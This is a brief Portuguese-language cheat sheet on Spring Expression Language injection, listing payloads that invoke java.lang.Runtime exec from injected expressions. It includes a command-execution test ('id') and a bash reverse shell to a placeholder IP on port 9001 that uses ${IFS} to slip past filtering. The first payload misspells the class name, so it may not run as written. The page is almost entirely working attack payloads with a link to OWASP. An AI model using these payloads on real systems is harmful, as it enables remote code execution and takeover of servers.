# Expression Language Injection - Spring

Linguagem de interação com o sistema de template Spring



**Duas formas iniciais de explorar**



**Explorar a partir de uma string ou variavel**\
\{{"".class.forName('java.lang.RunTime').getRunTime().exec\}}&#x20;



**Explorar chamando direto a funcao**\
T(java.lang.Runtime).getRuntime().exec("id")\
\
T(java.lang.Runtime).getRuntime().exec("bash -c bash${IFS}-i${IFS}>&/dev/tcp/IP/9001<&1")



{% embed url="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection" %}

